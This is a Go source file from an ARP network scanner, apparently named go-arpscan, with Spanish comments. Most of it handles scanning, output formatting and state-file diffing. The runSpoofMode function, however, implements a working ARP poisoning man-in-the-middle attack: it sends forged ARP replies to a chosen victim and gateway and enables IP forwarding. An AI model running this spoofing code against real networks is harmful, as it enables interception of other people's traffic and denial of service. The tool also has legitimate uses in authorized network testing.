// internal/runner/runner.go
package runner

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"go-arpscan/internal/config"
	"go-arpscan/internal/formatter"
	"go-arpscan/internal/scanner"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"sort"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/schollz/progressbar/v3"
)

// Runner encapsula la lógica de ejecución de un escaneo.
type Runner struct {
	cfg        *config.ResolvedConfig
	args       []string
	scanConfig *scanner.Config
}

// New crea una nueva instancia de Runner, validando la configuración inicial.
func New(cfg *config.ResolvedConfig, args []string) (*Runner, error) {
	// En modo spoof, no necesitamos la configuración completa del scanner, pero sí la interfaz.
	// buildScannerConfig se encarga de resolver la interfaz correctamente.
	scanCfg, err := buildScannerConfig(cfg, args)
	if err != nil {
		// Ignoramos el error de "no se especificaron objetivos" si estamos en modo spoof.
		if cfg.SpoofTargetIP == "" || !errors.Is(err, errNoTargets) {
			return nil, fmt.Errorf("fallo al construir la configuración de la aplicación: %w", err)
		}
	}

	return &Runner{
		cfg:        cfg,
		args:       args,
		scanConfig: scanCfg,
	}, nil
}

// Run ejecuta el flujo principal de la aplicación.
func (r *Runner) Run() error {
	// Decidir el modo de ejecución
	if r.cfg.SpoofTargetIP != "" {
		return r.runSpoofMode()
	}
	if r.cfg.DiffMode {
		return r.runDiffMode()
	}

	// Imprimir cabecera informativa si no estamos en modo scripting o diff
	if !isScriptingOutput(r.cfg) && r.cfg.StateFilePath == "" && !r.cfg.ShowProgress {
		printScanHeader(r.scanConfig, r.cfg)
	}

	shouldBufferResults := isScriptingOutput(r.cfg) || r.cfg.ShowProgress || r.cfg.StateFilePath != ""

	if shouldBufferResults {
		if !isScriptingOutput(r.cfg) && r.cfg.StateFilePath == "" {
			log.Printf("Iniciando escaneo en la interfaz %s (%s)", r.scanConfig.Interface.Name, r.scanConfig.Interface.HardwareAddr)
			log.Printf("Objetivos a escanear: %d IPs", len(r.scanConfig.IPs))
		}

		allResults := r.runScanAndCollect()

		if r.cfg.StateFilePath != "" {
			if err := saveStateToFile(allResults, r.cfg.StateFilePath); err != nil {
				// Es una advertencia, no un error fatal, para no interrumpir otros flujos.
				log.Printf("Advertencia: no se pudo guardar el fichero de estado: %v", err)
			}
			if !r.cfg.ShowProgress && !isScriptingOutput(r.cfg) {
				return nil // Si solo queríamos guardar, hemos terminado.
			}
		}

		sort.Slice(allResults.Results, func(i, j int) bool {
			ipA := net.ParseIP(allResults.Results[i].IP)
			ipB := net.ParseIP(allResults.Results[j].IP)
			if ipA == nil || ipB == nil {
				return allResults.Results[i].IP < allResults.Results[j].IP
			}
			return string(ipA.To16()) < string(ipB.To16())
		})

		if !isScriptingOutput(r.cfg) {
			f := formatter.NewDefaultFormatter(r.cfg.ShowRTT)
			f.PrintHeader()
			for _, res := range allResults.Results {
				f.PrintResult(res)
			}
			f.PrintFooter(allResults.ConflictSummaries, allResults.MultiIPSummaries)
		} else {
			printResults(allResults, r.cfg)
		}
	} else {
		r.runScanAndPrintRealTime()
	}

	if !isScriptingOutput(r.cfg) && r.cfg.StateFilePath == "" && !r.cfg.DiffMode {
		log.Println("Escaneo completado.")
	}
	return nil
}

func (r *Runner) runScanAndPrintRealTime() {
	var f formatter.Formatter
	if r.cfg.Plain {
		f = formatter.NewPlainFormatter(r.cfg.ShowRTT)
	} else {
		f = formatter.NewDefaultFormatter(r.cfg.ShowRTT)
	}

	resultsChan, err := scanner.StartScan(r.scanConfig)
	if err != nil {
		log.Fatalf("Error iniciando el escaneo: %v", err)
	}

	f.PrintHeader()

	summaries := processResults(resultsChan, r.cfg.IgnoreDups, r.cfg.VerboseCount, f.PrintResult)

	f.PrintFooter(summaries.ConflictSummaries, summaries.MultiIPSummaries)
}

func (r *Runner) runScanAndCollect() *AnalyzedResults {
	if r.cfg.ShowProgress && !isScriptingOutput(r.cfg) {
		bar := progressbar.NewOptions(
			len(r.scanConfig.IPs)*r.scanConfig.Retry,
			progressbar.OptionSetWriter(os.Stderr),
			progressbar.OptionShowCount(),
			progressbar.OptionSetWidth(30),
			progressbar.OptionSpinnerType(14),
			progressbar.OptionFullWidth(),
		)
		r.scanConfig.ProgressBar = bar
	}

	resultsChan, err := scanner.StartScan(r.scanConfig)
	if err != nil {
		log.Fatalf("Error iniciando el escaneo: %v", err)
	}

	var allResults []scanner.ScanResult
	summaries := processResults(resultsChan, r.cfg.IgnoreDups, r.cfg.VerboseCount, func(result scanner.ScanResult) {
		allResults = append(allResults, result)
	})

	if r.scanConfig.ProgressBar != nil {
		_ = r.scanConfig.ProgressBar.Finish()
	}

	return &AnalyzedResults{
		Results:           allResults,
		ConflictSummaries: summaries.ConflictSummaries,
		MultiIPSummaries:  summaries.MultiIPSummaries,
	}
}

func (r *Runner) runDiffMode() error {
	stateFile := r.cfg.StateFilePath
	log.Printf("Modo DIFF: Comparando el escaneo actual con el estado de '%s'", stateFile)

	stateContent, err := os.ReadFile(stateFile)
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return fmt.Errorf("el fichero de estado '%s' no existe. Ejecute un escaneo con --state-file para crearlo primero", stateFile)
		}
		return fmt.Errorf("error al leer el fichero de estado '%s': %w", stateFile, err)
	}

	var oldState formatter.JSONOutput
	if err := json.Unmarshal(stateContent, &oldState); err != nil {
		return fmt.Errorf("error al parsear el fichero de estado JSON '%s': %w", stateFile, err)
	}

	oldStateMap := make(map[string]hostInfo)
	for _, res := range oldState.Results {
		oldStateMap[res.IP] = hostInfo{MAC: res.MAC, Vendor: res.Vendor}
	}

	log.Printf("Iniciando nuevo escaneo para la comparación...")
	allNewResults := r.runScanAndCollect()

	newStateMap := make(map[string]hostInfo)
	for _, res := range allNewResults.Results {
		newStateMap[res.IP] = hostInfo{MAC: res.MAC, Vendor: res.Vendor}
	}
	log.Println("Escaneo de comparación completado. Analizando diferencias...")

	addedColor := color.New(color.FgHiGreen).SprintFunc()
	removedColor := color.New(color.FgHiRed).SprintFunc()
	modifiedColor := color.New(color.FgHiYellow).SprintFunc()
	headerColor := color.New(color.Bold).SprintFunc()

	hasChanges := false

	for ip, newInfo := range newStateMap {
		if oldInfo, found := oldStateMap[ip]; !found {
			fmt.Printf("%s\t%s\t%s\t(%s)\n", addedColor("[+] AÑADIDO:"), ip, newInfo.MAC, newInfo.Vendor)
			hasChanges = true
		} else {
			if newInfo.MAC != oldInfo.MAC {
				fmt.Printf("%s\t%s\n", modifiedColor("[~] MODIFICADO:"), headerColor(ip))
				fmt.Printf("\t  %s %s (%s)\n", removedColor("- MAC ANTERIOR:"), oldInfo.MAC, oldInfo.Vendor)
				fmt.Printf("\t  %s %s (%s)\n", addedColor("+ MAC NUEVA:   "), newInfo.MAC, newInfo.Vendor)
				hasChanges = true
			}
			delete(oldStateMap, ip)
		}
	}

	for ip, oldInfo := range oldStateMap {
		fmt.Printf("%s\t%s\t%s\t(%s)\n", removedColor("[-] ELIMINADO:"), ip, oldInfo.MAC, oldInfo.Vendor)
		hasChanges = true
	}

	if !hasChanges {
		log.Println("No se detectaron cambios en la red.")
	}
	return nil
}

// runSpoofMode ejecuta la lógica de suplantación ARP.
func (r *Runner) runSpoofMode() error {
	iface := r.scanConfig.Interface
	log.Printf("Activando modo de suplantación ARP en la interfaz %s (%s)", iface.Name, iface.HardwareAddr)

	victimIP := net.ParseIP(r.cfg.SpoofTargetIP)
	gatewayIP := net.ParseIP(r.cfg.GatewayIP)
	if victimIP == nil || gatewayIP == nil {
		return fmt.Errorf("IP de víctima o gateway inválida")
	}
	victimIP = victimIP.To4()
	gatewayIP = gatewayIP.To4()

	handle, err := pcap.OpenLive(iface.Name, 128, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("no se pudo abrir el handle de pcap para suplantación: %w", err)
	}
	defer handle.Close()

	// <-- INICIO DE LA CORRECCIÓN: Crear un PacketSource único y reutilizable -->
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	// <-- FIN DE LA CORRECCIÓN -->

	log.Println("Obteniendo dirección MAC de la víctima...")
	victimMAC, err := getMacForIP(handle, packetSource, iface, victimIP)
	if err != nil {
		return fmt.Errorf("no se pudo obtener la MAC de la víctima (%s): %w", victimIP, err)
	}
	log.Printf("-> MAC de la víctima (%s) obtenida: %s", victimIP, victimMAC)

	log.Println("Obteniendo dirección MAC del gateway...")
	gatewayMAC, err := getMacForIP(handle, packetSource, iface, gatewayIP)
	if err != nil {
		return fmt.Errorf("no se pudo obtener la MAC del gateway (%s): %w", gatewayIP, err)
	}
	log.Printf("-> MAC del gateway (%s) obtenida: %s", gatewayIP, gatewayMAC)

	if err := handle.SetBPFFilter(""); err != nil {
		log.Printf("Advertencia: no se pudo limpiar el filtro BPF final: %v", err)
	}

	if err := manageIPForwarding(true); err != nil {
		log.Printf("ADVERTENCIA: No se pudo activar el reenvío de IP. El ataque puede causar una denegación de servicio. Error: %v", err)
	} else {
		log.Println("Reenvío de IP activado en el sistema.")
	}

	ctx, cancel := context.WithCancel(context.Background())
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigs
		log.Println("\nSeñal de interrupción recibida. Limpiando y saliendo...")
		cancel()
	}()

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	log.Println("Iniciando bucle de envenenamiento ARP... Presiona Ctrl+C para detener.")
	for {
		select {
		case <-ticker.C:
			sendArpReply(handle, iface.HardwareAddr, victimMAC, gatewayIP, victimIP)
			sendArpReply(handle, iface.HardwareAddr, gatewayMAC, victimIP, gatewayIP)
		case <-ctx.Done():
			log.Println("Restaurando la caché ARP de la víctima y el gateway...")
			for i := 0; i < 5; i++ {
				sendArpReply(handle, gatewayMAC, victimMAC, gatewayIP, victimIP)
				sendArpReply(handle, victimMAC, gatewayMAC, victimIP, gatewayIP)
				time.Sleep(100 * time.Millisecond)
			}
			log.Println("Caché ARP restaurada.")

			if err := manageIPForwarding(false); err != nil {
				log.Printf("ADVERTENCIA: No se pudo desactivar el reenvío de IP: %v", err)
			} else {
				log.Println("Reenvío de IP desactivado.")
			}
			return nil
		}
	}
}

// getMacForIP ahora acepta un packetSource reutilizable.
func getMacForIP(handle *pcap.Handle, packetSource *gopacket.PacketSource, iface *net.Interface, ip net.IP) (net.HardwareAddr, error) {
	bpfFilter := fmt.Sprintf("arp and src host %s", ip.String())
	if err := handle.SetBPFFilter(bpfFilter); err != nil {
		return nil, fmt.Errorf("no se pudo establecer el filtro BPF para %s: %w", ip, err)
	}
	defer handle.SetBPFFilter("")

	srcIP, err := scanner.GetSrcIPNet(iface)
	if err != nil {
		return nil, fmt.Errorf("no se pudo obtener la IP de origen de la interfaz: %w", err)
	}

	eth := layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(iface.HardwareAddr),
		SourceProtAddress: []byte(srcIP.IP.To4()),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    []byte(ip.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buf, opts, &eth, &arp)
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		return nil, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	for {
		select {
		case packet := <-packetSource.Packets():
			if packet == nil {
				return nil, errors.New("el canal de paquetes se cerró inesperadamente")
			}
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arp, _ := arpLayer.(*layers.ARP)
			if arp.Operation == layers.ARPReply {
				return net.HardwareAddr(arp.SourceHwAddress), nil
			}
		case <-ctx.Done():
			return nil, fmt.Errorf("timeout esperando la respuesta ARP de %s", ip)
		}
	}
}

func sendArpReply(handle *pcap.Handle, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP) {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(dstIP.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buf, opts, &eth, &arp)
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		log.Printf("Error enviando paquete de suplantación: %v", err)
	}
}

var originalIPForwardingValue []byte

func manageIPForwarding(enable bool) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("la gestión automática de IP forwarding solo está soportada en Linux")
	}
	const ipForwardPath = "/proc/sys/net/ipv4/ip_forward"

	if enable {
		val, err := os.ReadFile(ipForwardPath)
		if err != nil {
			return fmt.Errorf("no se pudo leer el estado actual de ip_forward: %w", err)
		}
		originalIPForwardingValue = val
		return os.WriteFile(ipForwardPath, []byte("1"), 0644)
	}

	if originalIPForwardingValue != nil {
		return os.WriteFile(ipForwardPath, originalIPForwardingValue, 0644)
	}
	return os.WriteFile(ipForwardPath, []byte("0"), 0644)
}

func saveStateToFile(analyzed *AnalyzedResults, filePath string) error {
	output := formatter.JSONOutput{}
	output.Summary.Conflicts = analyzed.ConflictSummaries
	output.Summary.MultiIP = analyzed.MultiIPSummaries
	output.Results = make([]formatter.JSONResult, len(analyzed.Results))

	for i, r := range analyzed.Results {
		output.Results[i] = formatter.JSONResult{
			IP:     r.IP,
			MAC:    r.MAC,
			RTTms:  r.RTT.Milliseconds(),
			Vendor: r.Vendor,
			Status: r.Status,
		}
	}

	jsonData, err := json.MarshalIndent(output, "", "  ")
	if err != nil {
		return fmt.Errorf("error al generar JSON para el fichero de estado: %w", err)
	}

	if err := os.WriteFile(filePath, jsonData, 0644); err != nil {
		return fmt.Errorf("error al escribir en el fichero de estado '%s': %w", filePath, err)
	}

	log.Printf("Estado del escaneo guardado exitosamente en %s", filePath)
	return nil
}

func printResults(analyzed *AnalyzedResults, cfg *config.ResolvedConfig) {
	var f formatter.Formatter
	if cfg.JSONOutput {
		f = formatter.NewJSONFormatter()
	} else if cfg.CSVOutput {
		f = formatter.NewCSVFormatter()
	} else if cfg.Quiet {
		f = formatter.NewQuietFormatter()
	} else if cfg.Plain {
		f = formatter.NewPlainFormatter(cfg.ShowRTT)
	} else {
		f = formatter.NewDefaultFormatter(cfg.ShowRTT)
	}

	f.PrintHeader()
	for _, result := range analyzed.Results {
		f.PrintResult(result)
	}
	f.PrintFooter(analyzed.ConflictSummaries, analyzed.MultiIPSummaries)
}

func printScanHeader(scancfg *scanner.Config, cfg *config.ResolvedConfig) {
	log.Printf("Iniciando escaneo en la interfaz %s (%s)", scancfg.Interface.Name, scancfg.Interface.HardwareAddr)
	if scancfg.VlanID > 0 {
		log.Printf("Usando VLAN tag: %d", scancfg.VlanID)
	}
	log.Printf("Objetivos a escanear: %d IPs", len(scancfg.IPs))

	if scancfg.ArpSPADest {
		log.Println("Usando IP de origen dinámica igual a la IP de destino (--arpspa=dest).")
	} else if scancfg.ArpSPA != nil {
		log.Printf("Usando IP de origen personalizada (SPA) para todos los paquetes: %s", scancfg.ArpSPA)
	} else {
		log.Println("Usando IP de origen dinámica para cada paquete (comportamiento por defecto).")
	}

	if cfg.ArpSHA != "" {
		log.Printf("Usando MAC de origen personalizada (SHA) para todos los paquetes: %s", scancfg.ArpSHA)
	}
	if cfg.EthSrcMAC != "" {
		log.Printf("Usando MAC de origen de trama Ethernet personalizada para todos los paquetes: %s", scancfg.EthSrcMAC)
	}
	if cfg.EthPrototype != "0x0806" {
		log.Printf("Usando tipo de protocolo Ethernet personalizado: %s", cfg.EthPrototype)
	}
	if cfg.ArpOpCode != 1 {
		opCodeName := "Request"
		if cfg.ArpOpCode == 2 {
			opCodeName = "Reply"
		}
		log.Printf("Usando código de operación ARP personalizado: %d (%s)", cfg.ArpOpCode, opCodeName)
	}
	if cfg.EthDstMAC != "" {
		log.Printf("Usando MAC de destino de trama Ethernet personalizada para todos los paquetes: %s", scancfg.EthDstMAC)
	}
	if cfg.ArpTHA != "" {
		log.Printf("Usando MAC de destino ARP (THA) personalizada para todos los paquetes: %s", scancfg.ArpTHA)
	}
	if cfg.ArpHrd != 1 {
		log.Printf("Usando tipo de hardware ARP personalizado (ar$hrd): %d", scancfg.ArpHardwareType)
	}
	if cfg.ArpPro != "0x0800" {
		log.Printf("Usando tipo de protocolo ARP personalizado (ar$pro): %s", cfg.ArpPro)
	}
	if cfg.ArpHln != 6 {
		log.Printf("Usando longitud de dirección de hardware ARP personalizada (ar$hln): %d", scancfg.ArpHardwareLen)
	}
	if cfg.ArpPln != 4 {
		log.Printf("Usando longitud de dirección de protocolo ARP personalizada (ar$pln): %d", scancfg.ArpProtocolLen)
	}
	if cfg.PaddingHex != "" {
		log.Printf("Añadiendo relleno personalizado al paquete: %s", cfg.PaddingHex)
	}
	if cfg.UseLLC {
		log.Println("Usando framing RFC 1042 LLC/SNAP para los paquetes salientes.")
	}
	if cfg.PcapSaveFile != "" {
		log.Printf("Guardando respuestas ARP en el fichero pcap: %s", cfg.PcapSaveFile)
	}
}

func isScriptingOutput(cfg *config.ResolvedConfig) bool {
	return cfg.JSONOutput || cfg.CSVOutput || cfg.Plain || cfg.Quiet
}

type hostInfo struct {
	MAC    string
	Vendor string
}
